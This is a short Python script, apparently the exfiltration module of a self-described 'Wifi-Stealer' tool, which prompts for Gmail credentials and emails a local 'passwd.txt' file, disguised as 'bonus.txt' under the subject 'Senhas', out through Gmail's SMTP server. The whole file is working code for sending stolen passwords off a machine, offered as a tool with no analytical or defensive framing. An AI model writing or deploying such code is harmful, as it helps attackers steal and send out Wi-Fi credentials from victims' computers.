import os
import socket
import base64
import smtplib


from email.mime.text import MIMEText
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart




def getMail():

	print("Google Mail ... ")

	email = input("Email: ")
	passwd = input("Password: ")

	emailSend(email,passwd)


	pass


def emailSend(email, passwd):



	fromaddr = email
	toaddr = email

	msg = MIMEMultipart()

	msg['From'] = fromaddr
	msg['To'] = toaddr
	msg['Subject'] = "Senhas ... "

	body = "Wifi-Stealer  -  m4sk0fm3"

	msg.attach(MIMEText(body, 'plain'))

	filename = "bonus.txt"
	attachment = open("passwd.txt", "rb")

	part = MIMEBase('application', 'octet-stream')
	part.set_payload((attachment).read())
	encoders.encode_base64(part)
	part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

	msg.attach(part)

	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.starttls()
	server.login(fromaddr, passwd)
	text = msg.as_string()
	server.sendmail(fromaddr, toaddr, text)
	server.quit()



	pass

getMail()